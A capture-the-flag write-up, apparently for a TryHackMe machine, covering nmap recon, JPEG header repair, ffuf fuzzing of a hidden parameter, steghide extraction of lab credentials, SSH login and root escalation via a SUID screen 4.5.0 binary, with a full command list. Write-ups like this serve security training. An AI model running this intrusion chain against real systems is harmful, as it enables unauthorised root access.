# Madness CTF Challenge Write-Up

## Overview

This challenge begins with a corrupted image file and a hidden web path, then evolves into SSH access, file-based credential recovery, and finally a root privilege escalation via a vulnerable SUID `screen` binary. The workflow demonstrates a realistic CTF progression: initial reconnaissance, manual analysis, failed attempts, steganographic recovery, and exploitation of a privilege escalation vulnerability.

The challenge path is as follows:

- enumerate the target with Nmap
- discover a suspicious image file on the web server
- repair a corrupted JPEG header and inspect the image manually
- identify a hidden directory and brute-force a numeric parameter
- extract a hidden password via steghide from the repaired image
- uncover the true credentials from a second image and log in over SSH
- read the user flag
- find a SUID-root `screen` binary and escalate to root
- retrieve the final root flag

---

## 1. Initial Reconnaissance

### Port Scanning

```bash
nmap -sV 10.113.148.168
```

### Output

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 12:40 -0400
Nmap scan report for 10.113.148.168
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This tells us the machine exposes SSH and an HTTP service. The web application is the likely attack surface.

![Image Placeholder: Nmap scan output](./assets/nmap-scan.png)

---

## 2. Web Enumeration

### Downloading the Suspicious Image

```bash
wget http://10.113.148.168/thm.jpg
```

### Checking the File Type

```bash
file -k thm.jpg
```

```text
thm.jpg: data
```

This immediately suggests the file is corrupted or not truly a JPEG. The file extension is misleading.

### Inspecting the Header Bytes

```bash
xxd -l 16 thm.jpg
```

```text
00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
```

The header begins with PNG magic bytes (`89 50 4E 47`), which is not valid for a JPEG. This is a clear indicator that the file was intentionally modified or corrupted.

![Image Placeholder: JPEG header mismatch](./assets/jpeg-header.png)

---

## 3. Fixing the Corrupted JPEG

### Hex Editing the Header

```bash
xxd thm.jpg > dump.hex
nano dump.hex
```

The first line was corrected manually to the proper JPEG signature:

```text
0000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001
```

Then the file was rebuilt:

```bash
xxd -r dump.hex > thm-fix.jpg
file -k thm-fix.jpg
```

### Result

```text
thm-fix.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 400x400, components 3\012- data
```

The image is now valid and can be opened.

![Image Placeholder: Repaired JPEG](./assets/repaired-jpeg.png)

---

## 4. Initial Dead Ends and Manual Inspection

### Tools That Did Not Help Immediately

The notes indicate several failed or inconclusive attempts:

```bash
binwalk thm-fix.jpg
steghide extract -sf thm-fix.jpg
strings thm-fix.jpg
```

These tools either produced nothing useful or did not reveal the hidden data immediately.

> Important: This was a realistic troubleshooting phase. The image was valid, but the hidden content was not found by automated extraction. The next step was manual inspection by opening the file and reviewing the visible content.

### Opening the Image

Opening `thm-fix.jpg` revealed a hidden clue embedded in the image itself. It pointed to a path that was not obvious from the main page:

```text
http://10.113.148.168/th1s_1s_h1dd3n/
```

This indicates a directory with a hidden challenge page.

![Image Placeholder: Hidden web path revealed in image](./assets/hidden-image.png)

---

## 5. Hidden Directory and Secret Parameter Discovery

### Accessing the Hidden Path

```bash
wget http://10.113.148.168/th1s_1s_h1dd3n/
```

Inspecting the page source revealed a clue:

```html
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->
```

This strongly suggests a number between 0 and 99 is used as a parameter.

### Fuzzing the Parameter

The attacker generated a list of numbers and fuzzed the `secret` parameter.

```bash
seq 1 99 > numbers.txt
ffuf -u http://10.113.148.168/th1s_1s_h1dd3n/?secret=FUZZ -w numbers.txt -mc all
```

Because every response was `200 OK`, the attacker refined the attack by filtering based on response size:

```bash
ffuf -u http://10.113.148.168/th1s_1s_h1dd3n/?secret=FUZZ -w numbers.txt -fw 45
```

### Output

```text
73  [Status: 200, Size: 445, Words: 53, Lines: 19, Duration: 272ms]
```

This indicated the correct value was:

```text
?secret=73
```

### Viewing the Response

```bash
curl http://10.113.148.168/th1s_1s_h1dd3n/?secret=73
```

Observed response:

```text
Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B
```

This revealed a password candidate: `y2RPJ4QaPF!B`.

![Image Placeholder: Hidden directory result](./assets/hidden-dir.png)

---

## 6. Steganography and Hidden Password Extraction

### Attempting Steghide on the Repaired Image

The obvious next step was to run `steghide` on the repaired JPEG file:

```bash
steghide extract -sf thm-fix.jpg
```

### Input Prompt

```text
Enter passphrase:y2RPJ4QaPF!B
```

### Extracted Data

```text
wrote extracted data to "hidden.txt"
```

```bash
cat hidden.txt
```

### Output

```text
Fine you found the password!

Here's a username

wbxre

I didn't say I would make it easy for you!
```

This revealed a username hint: `wbxre`. However, this was not the final valid account name. The notes explicitly mention that the username was not directly usable, so additional investigation was required.

This is a classic example of misleading or decoy clues in a CTF challenge.

---

## 7. Second Image and Final Password Recovery

### External Image Download

The attacker later downloaded a second image from an external source mentioned by the challenge material:

```bash
wget https://assets.tryhackme.com/additional/imgur/5iW7kC8.jpg
```

Then they attempted steganographic extraction:

```bash
steghide extract -sf 5iW7kC8.jpg
```

This time, extraction succeeded and revealed the actual password:

```text
wrote extracted data to "password.txt"
```

```bash
cat password.txt
```

### Output

```text
I didn't think you'd find me! Congratulations!
Here take my password
*axA&GF8dP
```

This gave the final SSH password: `*axA&GF8dP`.

The hidden username clue from the first image was incomplete, but the notes indicate the real username was ultimately identified as:

```text
joker
```

So the valid credentials were:

```text
Username: joker
Password: *axA&GF8dP
```

![Image Placeholder: Final password extraction](./assets/stegano-password.png)

---

## 8. SSH Access as `joker`

### Logging In

```bash
ssh joker@10.113.148.168
```

### Password

```text
Password: *axA&GF8dP
```

This succeeded.

### Enumerating the Home Directory

```bash
ls -la
```

### Output

```text
total 20
drwxr-xr-x 3 joker joker 4096 Oct 29 10:56 .
drwxr-xr-x 3 root  root  4096 Jan  4  2020 ..
-rw------- 1 joker joker    0 Jan  5  2020 .bash_history
-rw-r--r-- 1 joker joker 3771 Jan  4  2020 .bashrc
drwx------ 2 joker joker 4096 Oct 29 10:56 .cache
-rw-r--r-- 1 root  root    38 Jan  6  2020 user.txt
```

The user flag is present in the home directory:

```bash
cat user.txt
```

This confirms the user-level foothold.

![Image Placeholder: SSH login as joker](./assets/joker-login.png)

---

## 9. Privilege Escalation Search

### Searching for SUID Binaries

```bash
find / -perm -4000 -type f -ls 2>/dev/null
```

### Relevant Result

```text
150852   1552 -rwsr-xr-x   1 root     root        1588648 Jan  4  2020 /bin/screen-4.5.0
```

This is a classic, vulnerable SUID-root binary. The presence of `/bin/screen-4.5.0` strongly suggests an exploit path for local privilege escalation.

The notes also explicitly mention the exploit reference:

```text
https://www.exploit-db.com/exploits/41154
```

This is the known route for privilege escalation.

---

## 10. Exploiting the Vulnerable Screen Binary

### Creating the Exploit Script

The attacker created a temporary script in `/tmp`:

```bash
nano up.sh
chmod +x up.sh
./up.sh
```

The exploit script uses the known `screen` SUID-root vulnerability to spawn a shell with elevated privileges.

### Result

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root),1000(joker)
```

This confirms a successful root shell.

![Image Placeholder: Root shell via screen exploit](./assets/root-shell.png)

---

## 11. Root Flag Retrieval

### Accessing the Root Directory

```bash
cd /root
ls
cat root.txt
```

This gives the final root flag and completes the challenge.

---

## 12. Summary of the Exploit Chain

1. Ran `nmap` and found SSH and HTTP
2. Downloaded `thm.jpg` and discovered it was corrupted
3. Repaired the JPEG header and opened the image manually
4. Found a hidden directory at `/th1s_1s_h1dd3n/`
5. Fuzzed the `secret` parameter and found the correct value `73`
6. Extracted `y2RPJ4QaPF!B` from the hidden directory response
7. Used `steghide` on the repaired image and discovered a username hint (`wbxre`)
8. Downloaded a second image and extracted the real password (`*axA&GF8dP`)
9. Logged in over SSH as `joker`
10. Read the user flag
11. Found the SUID-root `screen-4.5.0` binary
12. Exploited it to obtain a root shell
13. Read `/root/root.txt`

---

## 13. Key Takeaways

- Corrupted file headers can hide visual clues and lead to hidden web paths.
- Manual inspection of images can be more effective than automated tools in some CTFs.
- `ffuf` is useful for brute-forcing numeric parameters when the application is not obvious.
- Steganography can hide both usernames and passwords in JPEG files.
- SUID-root binaries like `screen` are classic privilege escalation targets in Linux-based CTFs.

> Important: This challenge is a good example of layered CTF logic: repair a corrupted file, discover a hidden page, extract a password via steganography, then use a known privilege escalation vulnerability to reach root.

---

## 14. Relevant Commands

```bash
nmap -sV 10.113.148.168
wget http://10.113.148.168/thm.jpg
file -k thm.jpg
xxd -l 16 thm.jpg
xxd thm.jpg > dump.hex
nano dump.hex
xxd -r dump.hex > thm-fix.jpg
file -k thm-fix.jpg
binwalk thm-fix.jpg
steghide extract -sf thm-fix.jpg
strings thm-fix.jpg
wget http://10.113.148.168/th1s_1s_h1dd3n/
seq 1 99 > numbers.txt
ffuf -u http://10.113.148.168/th1s_1s_h1dd3n/?secret=FUZZ -w numbers.txt -mc all
ffuf -u http://10.113.148.168/th1s_1s_h1dd3n/?secret=FUZZ -w numbers.txt -fw 45
curl http://10.113.148.168/th1s_1s_h1dd3n/?secret=73
steghide extract -sf thm-fix.jpg
cat hidden.txt
wget https://assets.tryhackme.com/additional/imgur/5iW7kC8.jpg
steghide extract -sf 5iW7kC8.jpg
cat password.txt
ssh joker@10.113.148.168
ls -la
cat user.txt
find / -perm -4000 -type f -ls 2>/dev/null
nano up.sh
chmod +x up.sh
./up.sh
id
cd /root
ls
cat root.txt
```

---

## Final Result

The Madness machine was successfully completed by repairing a corrupted image, uncovering a hidden directory, extracting credentials via steganography, logging in as `joker`, and exploiting a vulnerable SUID `screen` binary to achieve root access. The final root flag was retrieved from `/root/root.txt`.

![Image Placeholder: Final challenge completion](./assets/final-result.png)
